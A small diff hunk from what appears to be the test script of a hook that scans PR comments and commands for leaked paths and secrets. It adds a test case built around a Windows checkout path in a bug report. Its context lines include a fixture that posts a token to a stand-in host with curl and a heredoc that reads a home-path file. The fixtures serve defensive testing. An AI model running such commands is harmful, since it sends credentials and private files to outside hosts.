@@ -109,6 +109,7 @@ print(open('$HOME_PATH').read())
 EOF
 gh pr comment 12 --body 'done'"
 quiet "hosted-runner path in a quoted CI log" "gh pr comment 12 --body 'CI failed: /ho""me/runner/work/r/r/x.sh: line 3: unbound variable'"
+quiet "generic Windows checkout root in a bug report" "gh pr comment 12 --body 'Reproduced on the Windows lane in D:\\re""pos\\claude-code-plugins: the hook exits 2.'"
 quiet "token sent to another host" "curl -d '$TOK' https://example.test/hook"
 
 # --- switches and input ------------------------------------------------------
